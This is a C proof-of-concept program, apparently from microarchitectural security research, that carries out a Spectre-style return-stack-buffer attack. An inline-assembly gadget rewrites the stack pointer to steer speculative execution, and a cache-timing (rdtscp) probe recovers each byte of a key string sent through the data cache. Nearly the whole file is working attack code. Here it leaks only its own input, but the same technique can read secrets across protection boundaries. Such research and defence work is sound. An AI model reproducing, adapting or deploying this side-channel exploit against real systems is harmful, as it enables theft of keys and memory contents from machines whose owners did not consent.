#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <x86intrin.h>

#define THRESHHOLD 80

#define NOP "nop;"
#define NOP1 NOP
#define NOP2 NOP1 NOP1
#define NOP4 NOP2 NOP2
#define NOP8 NOP4 NOP4
#define NOP16 NOP8 NOP8
#define NOP32 NOP16 NOP16
#define NOP64 NOP32 NOP32
#define NOP128 NOP64 NOP64
#define NOP256 NOP128 NOP128
#define NOP512 NOP256 NOP256
#define NOP1024 NOP512 NOP512
#define NOP2048 NOP1024 NOP1024

/* default: 64B line size, L1-D 64KB assoc 2, L1-I 32KB assoc 2, L2 2MB assoc 8 */
#define LLC_SIZE (4 << 20)
uint8_t dummy[LLC_SIZE];

int str_num;
char key_str[20];
char guess_str[20];

void *rsp_addr;
int *ptr1;
int **ptr2;
int ***ptr3;
int ****ptr4;
int *****ptr5;

uint8_t array2[257 * 64] __attribute__((aligned(64)));

void rsb_gadget() {
    asm("pop %rbp;"
        "pop %rdi;");

    asm("mov %%rbp, %0;"
        : "+m"(ptr1)
        :);
    ptr2 = &ptr1;
    ptr3 = &ptr2;
    ptr4 = &ptr3;
    ptr5 = &ptr4;

    rsp_addr = (void*)****ptr5;

    asm("mov %0, %%rsi;"
        "mov %%rsi, %%rsp;"
        :
        : "m"(rsp_addr));
}

void encode(uint8_t key, uint8_t *arr) {
    asm("shl $0x6, %rdi;"
        "add %rdi, %rsi;");
    rsb_gadget();
    asm("mov (%rsi), %rax;");
}

uint8_t decode() {
	unsigned long time1, time2;
	uint8_t tmp, res;

    for (int i = 0; i < 256; i++) {
		unsigned int junk;
		_mm_mfence();
		time1 = __rdtscp(&junk);
		_mm_lfence();
		tmp ^= array2[i * 64];
		time2 = __rdtscp(&junk);
		_mm_lfence();
		if (time2 - time1 < THRESHHOLD) {
			res = (uint8_t)i;
		}
	}

	return res;
}

uint8_t count_result(uint8_t results[], int begin, int end) {
    int count[256] = {0}, max = 0, i = begin;
	uint8_t tmp, max_ch = 0;
    for (; i < end; i++) {
		tmp = results[i];
		if ((++count[tmp]) > max) {
			max = count[tmp];
			max_ch = tmp;
		}
	}
	return max_ch;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        perror("ERROR: You must input two arguments as [sample_number] [key string]!\n");
        exit(-1);
    }

    int sample_num, i, j;
    sample_num = atoi(argv[1]);

    str_num = strlen(argv[2]);
    if (str_num >= 20) {
        perror("ERROR: The length of sending key string must be smaller than 20!\n");
        exit(-1);
    }

	strncpy(key_str, argv[2], str_num);
	printf("======> 1. Save the sending key string: %s\n", key_str);

    memset(dummy, 1, sizeof(dummy));
    asm("cpuid;"
        ::
        : "eax", "ebx", "ecx", "edx");

    printf("======> 2. Transmit the key string via dcache channel: \n");
    uint8_t *sample_results = malloc(sizeof(uint8_t) * sample_num);
	for (i = 0; i < str_num; i++) {
        printf("Character-%d: %d -> ", i, (int)(key_str[i]));
        for (j = 0; j < sample_num; j++) {
            uint8_t tmp = key_str[i];
            asm(NOP2);
            _mm_mfence();
            _mm_lfence();
            encode(tmp, array2);
			asm(NOP128);
            asm("cpuid;"
                :: 
                : "eax", "ebx", "ecx", "edx");
            sample_results[j] = decode();
			printf("%d ", (int)(sample_results[j]));
			memset(dummy, 1, sizeof(dummy));
            _mm_mfence();
            _mm_lfence();
        }
		guess_str[i] = (char)count_result(sample_results, 0, sample_num);
		printf("= %d\n", guess_str[i]);
        memset(dummy, 1, sizeof(dummy));
        asm(NOP1024);
        asm("cpuid;"
            ::
            : "eax", "ebx", "ecx", "edx");
    }

	printf("The guessed key string is: %s\n", guess_str);

	return 0;

}